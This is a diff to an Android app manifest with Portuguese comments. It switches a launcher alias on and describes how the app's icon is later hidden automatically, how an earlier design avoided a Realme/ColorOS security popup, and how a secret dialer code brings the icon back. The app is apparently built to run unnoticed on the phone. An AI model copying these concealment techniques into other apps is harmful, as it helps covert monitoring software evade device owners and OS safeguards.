@@ -103,26 +103,22 @@
         </activity>
 
         <!-- ── Alias de Launcher (entrada visível na gaveta de apps) ─────────────
-             O alias começa DESABILITADO (enabled="false") para que o ícone nunca
-             apareça no launcher logo após a instalação.
+             O alias começa HABILITADO para que o botão "Abrir" do instalador
+             de APK funcione (o Android usa getLaunchIntentForPackage() que
+             exige uma entrada CATEGORY_LAUNCHER habilitada).
 
-             Vantagens:
-             - Realme/ColorOS 12+: o sistema mostra um popup de segurança quando
-               um app OCULTA um ícone já visível. Iniciando desabilitado, o ícone
-               nunca aparece — nenhum popup é exibido.
-             - Samsung/Xiaomi/outros: comportamento idêntico ao atual.
-
-             Como o usuário abre o app pela primeira vez:
-             - O instalador de APK mostra o botão "Abrir" que inicia a MainActivity
-               diretamente (intent explícito — não usa o alias), então o setup
-               funciona normalmente sem que o ícone apareça no launcher.
+             O ícone é ocultado de duas formas:
+             - Após o setup: o usuário clica "Ocultar agora" → hideLauncherIcon()
+             - Em updates: o onCreate() da MainActivity chama hideLauncherIcon()
+               automaticamente quando o app já está vinculado a uma conta, evitando
+               que o ícone reapareça após atualização de versão.
 
              Para restaurar o ícone: usar o código secreto *#*#7777#*#* que chama
              SecretCodeReceiver → setComponentEnabledSetting(ENABLED).              -->
         <activity-alias
             android:name=".MainActivityAlias"
             android:targetActivity=".MainActivity"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true"
             android:label="Protect"
             android:icon="@android:drawable/ic_menu_compass">
